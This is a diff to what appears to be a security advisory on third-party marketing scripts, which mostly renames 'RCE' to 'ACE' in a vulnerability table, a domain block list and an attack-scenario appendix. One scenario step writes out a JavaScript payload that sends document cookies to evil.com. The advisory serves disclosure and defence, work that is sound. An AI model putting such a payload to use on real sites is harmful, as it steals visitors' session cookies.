@@ -17,7 +17,7 @@
 | **DemonScript** | eval() arbitrary code execution | 9.8 | Any TrenDemon customer can execute JS on your visitors |
 | **PollyWannaCrack** | polyfill.io supply chain | 10.0 | Chinese malware loaded on older browsers |
 | **ZeroSense** | Cross-customer PII cache | 9.1 | Phone/address cached for 760 days across ALL 6sense customers |
-| **RollCredits** | Video completion RCE | 9.8 | Wistia/Brightcove videos trigger eval() |
+| **RollCredits** | Video completion ACE | 9.8 | Wistia/Brightcove videos trigger eval() |
 | **MaCook'd** | Marketo cookie theft | 7.5 | _mkto_trk Base64'd and exfiltrated |
 
 **Discovery Method**: Outside-in reconnaissance. HAR capture while browsing 6sense.com privacy pages.
@@ -348,7 +348,7 @@ See [BLACKOUT Protocol deployment guides](../KITS/).
 
 **Block List**:
 ```
-# TrenDemon (CRITICAL - eval RCE)
+# TrenDemon (CRITICAL - eval ACE)
 trackingapi.trendemon.com
 assets.trendemon.com
 trendemon.com
@@ -476,7 +476,7 @@ The vendors are NOT the victims. Website visitors are.
 ## RELATED ADVISORIES
 
 - **BTI-2025-0023**: 6sense Surveillance Stack (parent investigation)
-- **BTI-2025-0025**: TrenDemon eval() RCE + Supply Chain
+- **BTI-2025-0025**: TrenDemon eval() ACE + Supply Chain
 - **BTI-2025-0001**: RB2B Defeat Device ([Playbook](REMEDIATION-PLAYBOOK.md))
 
 ---
@@ -496,7 +496,7 @@ The vendors are NOT the victims. Website visitors are.
 
 ## APPENDIX B: Attack Scenarios
 
-### Scenario 1: Customer-Level RCE
+### Scenario 1: Customer-Level ACE
 1. Attacker creates TrenDemon account
 2. Configures CTA: `CustomClickTrackingCode: "fetch('https://evil.com/'+document.cookie)"`
 3. Deploys CTA on target website
